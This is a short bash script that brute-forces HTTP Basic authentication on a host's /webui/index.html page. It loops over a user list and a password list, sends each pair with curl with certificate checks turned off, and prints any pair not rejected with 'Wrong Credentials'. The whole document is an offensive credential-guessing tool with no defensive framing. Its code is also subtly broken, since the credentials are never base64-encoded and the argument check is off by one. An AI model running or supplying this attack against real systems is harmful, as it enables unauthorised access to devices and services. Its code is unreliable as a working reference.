#!/bin/bash
if [ -z $2 ]; then printf "\nSyntax: $0 <host> <userlist> <passlist>\n\n"
else
HOST=$1; USER=$2; PASS=$3;
for u in `<$USER`; do
  for p in `<$PASS`; do
    b=`echo -n "$u:$p"`
    guess=`curl -H "authorization: Basic $b" -sk https://$HOST/webui/index.html |grep 'Wrong Credentials'`
    if [ -z "$guess" ]; then
      echo "[+] $u:$p"
    fi
  done
done
fi
